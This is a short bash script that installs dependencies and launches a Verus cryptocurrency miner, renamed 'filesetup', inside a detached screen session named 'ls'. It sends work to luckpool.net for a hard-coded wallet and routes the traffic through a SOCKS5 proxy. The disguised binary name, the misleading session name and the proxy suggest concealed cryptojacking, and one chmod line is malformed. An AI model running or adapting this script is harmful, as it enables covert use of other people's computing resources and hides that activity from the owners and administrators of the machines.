#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x tole.sh && chmod +x filesetup chmod 777 filesetup tole.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=R9LpRWVXVJhhmBctpKHvWvDc9x1hWXwXNv
WORKER=$(echo $(shuf -i 1-10 -n 1)hape)
PROXY=socks5://98.184.33.205:4145
./filesetup -a verus -o stratum+tcp://eu.luckpool.net:3956 -u R9LpRWVXVJhhmBctpKHvWvDc9x1hWXwXNv.RIZA4 -t 8 -x socks5://98.184.33.205:4145








